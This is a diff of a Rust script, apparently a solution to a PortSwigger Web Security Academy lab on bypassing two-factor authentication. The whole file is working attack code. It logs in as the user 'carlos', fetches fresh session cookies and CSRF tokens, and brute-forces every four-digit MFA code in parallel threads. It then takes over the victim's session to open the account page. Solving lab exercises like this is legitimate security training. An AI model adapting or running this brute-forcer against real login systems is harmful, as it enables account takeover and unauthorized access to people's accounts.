@@ -1,255 +1,119 @@
 /************************************************************************
 *
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 31/8/2023
-*
 * Lab: 2FA bypass using a brute-force attack
 *
-* Steps: 1. GET /login page and extract the session from cookie header
-*           and csrf token from the body
-*        2. POST /login with valid credentials, extracted session
-*           and the csrf token
-*        3. Obtain the new session
-*        4. GET /login2 with the new session
-*        5. Extract the csrf token from the body of /login2
-*        6. POST the mfa-code with the new session and the new
-*           extracted csrf token
-*        7. Repeat the process with all possbile numbers
+* Hack Steps: 
+*      1. Fetch the login page
+*      2. Get the session cookie and extract the csrf token
+*      3. Login in as carlos
+*      4. Get the new session
+*      5. Fetch the login2 page
+*      6. Extract the csrf token
+*      7. Post the mfa-code
+*      8. Repeat the process with all possbile numbers
 *
 *************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
 use lazy_static::lazy_static;
-use rayon::prelude::*;
+use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
+    Error,
 };
-use select::{document::Document, predicate::Attr, predicate::Name};
+use select::{document::Document, predicate::Attr};
 use std::{
     collections::HashMap,
-    error::Error,
     io,
     io::Write,
-    process,
     sync::{
-        atomic::{AtomicUsize, Ordering},
+        atomic::{AtomicBool, AtomicUsize, Ordering},
         Arc, Mutex,
     },
-    thread,
     time::{self, Duration, Instant},
 };
 use text_colorizer::Colorize;
 
-/******************
-* Global variables
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a49003003bc1b9083d9934900cd005b.web-security-academy.net";
+
 lazy_static! {
-    static ref VALID_CODE: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
-    static ref FAILED_CODES: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
-    static ref FAILED_CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
     static ref CODES_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref CARLOS_SESSION: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
+    static ref CARLOS_SESSION_IS_FOUND: AtomicBool = AtomicBool::new(false);
+    static ref SCRIPT_START_TIME: Instant = time::Instant::now();
+    static ref WEB_CLIENT: Client = build_web_client();
 }
 
-/******************
-* Main Function
-*******************/
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a2800260408bd5d8776e031006500e2.web-security-academy.net";
+    let threads = 6; // You can experiment with the number of threads by adjusting this variable
+    let ranges = build_code_ranges(0, 10000, threads);
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
+    println!("⦗*⦘ Brute forcing the mfa-code of carlos..");
 
-    // make the ranges ready to run them in multiple threads
-    let ranges = build_ranges();
+    ranges.par_iter().for_each(|range| {
+        // Use every range in a different thread
+        for code in range {
+            let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+            if is_found {
+                break;
+            } else {
+                if let Ok(login_page) = fetch("/login") {
+                    let mut session = get_session_cookie(&login_page);
+                    let mut csrf_token = get_csrf_token(login_page);
 
-    // capture the time before starting
-    let start_time = time::Instant::now();
+                    if let Ok(login_as_carlos) = login_as_carlos(&session, &csrf_token) {
+                        session = get_session_cookie(&login_as_carlos);
 
-    // start brute forcing the mfa-code
-    brute_force_2fa(start_time, &client, url, ranges);
+                        if let Ok(login2_page) = fetch_with_session("/login2", &session) {
+                            csrf_token = get_csrf_token(login2_page);
 
-    // when using multithreads some request will fail due to unknown issues
-    // the next few lines will try the failed codes again
-    let failed_codes: Vec<i32> = FAILED_CODES
-        .lock()
-        .unwrap()
-        .iter()
-        .map(|f| f.parse::<i32>().unwrap())
-        .collect();
+                            if let Ok(post_code) = post_mfa_code(&session, &csrf_token, code) {
+                                if post_code.status().as_u16() == 302 {
+                                    print_correct_code(code);
 
-    // get the total number of failed codes
-    let total_failed_codes = failed_codes.len();
-
-    // specify how many codes will be tried in every thread
-    // 4 is the number of threads
-    let failed_chunkes: Vec<Vec<i32>> = failed_codes
-        .chunks(total_failed_codes / 4)
-        .map(|f| f.to_owned())
-        .collect();
-
-    println!("{}", "\n[#] Retrying the failed codes..".white().bold());
-
-    // try the failed codes again
-    brute_force_2fa(start_time, &client, url, failed_chunkes);
-
-    // print some useful information to the terminal
-    println!("\n{}", "[!] No valid code is found".red().bold());
-    print_finish_message(start_time);
-    print_failed_requests();
-}
-
-/******************************************
-* Function use to brute force the mfs-code
-*******************************************/
-fn brute_force_2fa(start_time: Instant, client: &Client, url: &str, ranges: Vec<Vec<i32>>) {
-    println!(
-        "{} {}..",
-        "[#] Brute forcing the mfa-code of".white().bold(),
-        "carlos".green().bold()
-    );
-    // run every subrange in a different thread
-    ranges.par_iter().for_each(|minilist| {
-        // iterate over codes in every subrange
-        for code in minilist {
-            // iterate only if no valid code is found; this condition keeps the all threads from continuing if a valid code is found
-            if VALID_CODE.lock().unwrap().len() == 0 {
-                // GET /login page
-                let get_login = client.get(format!("{url}/login").as_str()).send();
-
-                // if you GET /login successfully
-                if let Ok(get_login_res) = get_login {
-                    // get the new session
-                    let get_login_session = extract_session_cookie(get_login_res.headers());
-
-                    // get the csrf token
-                    let get_login_csrf = extract_csrf(get_login_res);
-
-                    // try to login with valid credentials
-                    let post_login = client
-                        .post(format!("{url}/login"))
-                        .header("Cookie", format!("session={get_login_session}"))
-                        .form(&HashMap::from([
-                            ("username", "carlos"),
-                            ("password", "montoya"),
-                            ("csrf", &get_login_csrf),
-                        ]))
-                        .send();
-
-                    // if you logged in successfully
-                    if let Ok(post_login_res) = post_login {
-                        // get the new session
-                        let post_login_session = extract_session_cookie(post_login_res.headers());
-
-                        // GET /login2 with the new session
-                        let get_login2 = client
-                            .get(format!("{url}/login2"))
-                            .header("Cookie", format!("session={post_login_session}"))
-                            .send();
-
-                        // if you GET /login2 successfully
-                        if let Ok(get_login2_res) = get_login2 {
-                            // get the new csrf token
-                            let get_login2_csrf = extract_csrf(get_login2_res);
-
-                            // try to POST the mfa-code with the new session and the new csrf token
-                            let post_code = client
-                                .post(format!("{url}/login2"))
-                                .header("Cookie", format!("session={post_login_session}"))
-                                .form(&HashMap::from([
-                                    ("csrf", &get_login2_csrf),
-                                    ("mfa-code", &format!("{code:04}")),
-                                ]))
-                                .send();
-
-                            // if POST code is done successfully
-                            if let Ok(post_code_res) = post_code {
-                                // if a redirect happens; this means a valid code
-                                if post_code_res.status().as_u16() == 302 {
-                                    println!(
-                                        "\n✅ {}: {}",
-                                        "Correct code".white().bold(),
-                                        format!("{code:04}").green().bold(),
-                                    );
-
-                                    // get the new session
-                                    let new_session =
-                                        extract_session_cookie(post_code_res.headers());
-
-                                    println!(
-                                        "{}: {}",
-                                        "✅ New session".white().bold(),
-                                        new_session.green().bold()
-                                    );
-                                    println!(
-                                        "{} {}",
-                                        "Use this session in your browser to login as"
-                                            .white()
-                                            .bold(),
-                                        "carlos".green().bold()
-                                    );
-
-                                    // update the valid code global variable
-                                    VALID_CODE.lock().unwrap().push_str(&format!("{code:04}"));
-
-                                    // print some useful information to the terminal
-                                    print_finish_message(start_time);
-                                    print_failed_requests();
-
-                                    // exit from the program
-                                    process::exit(0);
+                                    let carlos_session = get_session_cookie(&post_code);
+                                    CARLOS_SESSION.lock().unwrap().push_str(&carlos_session);
+                                    CARLOS_SESSION_IS_FOUND.fetch_or(true, Ordering::Relaxed);
+                                    break;
                                 } else {
-                                    // if the submitted code is incorrect
-                                    print!(
-                                        "\r[*] {}: {} minutes || {}: {} || ({}/10000) {} => {}",
-                                        "Elapsed".yellow(),
-                                        start_time.elapsed().as_secs() / 60,
-                                        "Failed".red(),
-                                        FAILED_CODES_COUNTER.fetch_add(0, Ordering::Relaxed),
-                                        CODES_COUNTER.fetch_add(1, Ordering::Relaxed),
-                                        format!("{code:04}").blue(),
-                                        "Incorrect".red()
-                                    );
-                                    io::stdout().flush();
+                                    print_progress(code);
                                 }
+                            } else {
+                                print_failed_code(code);
+                                continue;
                             }
                         } else {
-                            // if the GET /login2 failed to unknown reason, save the code to try it again
-                            FAILED_CODES.lock().unwrap().push(format!("{code:04}"));
-                            FAILED_CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
+                            print_failed_code(code);
                             continue;
                         }
                     } else {
-                        // if the login with valid credentials failed to unknown reason, save the code to try it again
-                        FAILED_CODES.lock().unwrap().push(format!("{code:04}"));
-                        FAILED_CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
+                        print_failed_code(code);
                         continue;
                     }
                 } else {
-                    // if the GET /login failed to unknown reason, save the code to try it again
-                    FAILED_CODES.lock().unwrap().push(format!("{code:04}"));
-                    FAILED_CODES_COUNTER.fetch_add(1, Ordering::Relaxed);
+                    print_failed_code(code);
                     continue;
                 }
-            } else {
-                // if a valid code is found; exit from the thread
-                return;
             }
         }
-    })
+    });
+
+    let is_found = CARLOS_SESSION_IS_FOUND.fetch_and(true, Ordering::Relaxed);
+    if is_found {
+        print!("\n⦗*⦘ Fetching carlos profile.. ");
+        let carlos_session = CARLOS_SESSION.lock().unwrap();
+        fetch_with_session("/my-account", &carlos_session)
+            .expect("⦗!⦘ Failed to fetch carlos profile");
+        println!("{}", "OK".green())
+    } else {
+        println!("⦗!⦘ Failed to get carlos session")
+    }
+
+    print_finish_message();
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -257,77 +121,98 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*********************************************************************
-* Function used to build a set of ranges
-* Every range will be in one thread
-* Feel free to change the number of vectors and the range in each one
-**********************************************************************/
-fn build_ranges() -> Vec<Vec<i32>> {
-    let mut list = Vec::new();
-    list.push((0..2000).collect::<Vec<i32>>());
-    list.push((2000..4000).collect::<Vec<i32>>());
-    list.push((4000..6000).collect::<Vec<i32>>());
-    list.push((6000..8000).collect::<Vec<i32>>());
-    list.push((8000..10000).collect::<Vec<i32>>());
-    list
+fn fetch(path: &str) -> Result<Response, Error> {
+    WEB_CLIENT.get(format!("{LAB_URL}{path}")).send()
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> String {
-    Document::from(res.text().unwrap().as_str())
+fn fetch_with_session(path: &str, session: &str) -> Result<Response, Error> {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+}
+
+fn login_as_carlos(session: &str, csrf_token: &str) -> Result<Response, Error> {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("username", "carlos"),
+            ("password", "montoya"),
+            ("csrf", &csrf_token),
+        ]))
+        .send()
+}
+
+fn post_mfa_code(session: &str, csrf_token: &str, code: &i32) -> Result<Response, Error> {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login2"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("csrf", csrf_token),
+            ("mfa-code", &&format!("{code:04}")),
+        ]))
+        .send()
+}
+
+fn build_code_ranges(start: i32, end: i32, threads: i32) -> Vec<Vec<i32>> {
+    let chunk_size = (end - start) / threads;
+    (start..end)
+        .collect::<Vec<i32>>()
+        .chunks(chunk_size as usize)
+        .map(|x| x.to_owned())
+        .collect::<Vec<Vec<i32>>>()
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-        .unwrap()
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
         .to_string()
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> String {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    extract_pattern("session=(.*); Secure", cookie)
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*);", cookie_header)
 }
 
-/*******************************************
-* Function to extract a pattern form a text
-********************************************/
-fn extract_pattern(pattern: &str, text: &str) -> String {
-    Regex::new(pattern)
-        .unwrap()
-        .captures(text)
-        .unwrap()
-        .get(1)
-        .unwrap()
-        .as_str()
-        .to_string()
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
 }
 
-/********************************************************
-* Function used to print finish time
-*********************************************************/
-#[inline(always)]
-fn print_finish_message(start_time: Instant) {
-    println!(
-        "\n{}: {:?} minutes",
-        "✅ Finished in".green().bold(),
-        start_time.elapsed().as_secs() / 60
+fn print_progress(code: &i32) {
+    let elapsed_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
+    print!(
+        "\r❯❯ Elapsed: {} minutes || Trying ({}/10000) {} => {}",
+        elapsed_time.yellow(),
+        CODES_COUNTER.fetch_add(1, Ordering::Relaxed),
+        format!("{code:04}").blue(),
+        "Wrong".red()
     );
+    io::stdout().flush().unwrap();
 }
 
-/**********************************
-* Function used print failed codes
-***********************************/
-#[inline(always)]
-fn print_failed_requests() {
-    let failed_codes = FAILED_CODES.lock().unwrap();
+fn print_correct_code(code: &i32) {
+    println!("\n🗹 Correct code: {}", format!("{code:04}").green());
+}
+
+fn print_failed_code(code: &i32) {
     println!(
-        "\n{}: {} \n{}: {:?}",
-        "[!] Failed codes count".red().bold(),
-        failed_codes.len().to_string().yellow().bold(),
-        "[!] Failed codes".red().bold(),
-        failed_codes
+        "\n⦗!⦘ Failed to post the code: {}",
+        format!("{code:04}").red()
     )
+}
+
+fn print_finish_message() {
+    let elapased_time = (SCRIPT_START_TIME.elapsed().as_secs() / 60).to_string();
+    println!("🗹 Finished in: {} minutes", elapased_time.yellow());
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
